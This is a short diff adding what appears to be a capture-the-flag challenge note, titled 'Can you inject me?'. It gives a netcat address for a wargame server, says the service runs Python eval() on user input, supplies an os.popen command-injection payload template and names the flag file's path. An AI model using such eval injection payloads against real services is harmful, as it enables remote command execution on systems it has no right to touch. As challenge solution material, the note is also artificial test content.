@@ -1,0 +1,11 @@
+Can you inject me?
+
+nc chall04-pwn02.wargame.whitehat.vn 26082
+---------------
+
+It's running a python eval() on user input.
+
+
+__import__('os').popen('<COMMAND>').read()
+
+Flag is in /home/inject1/flag
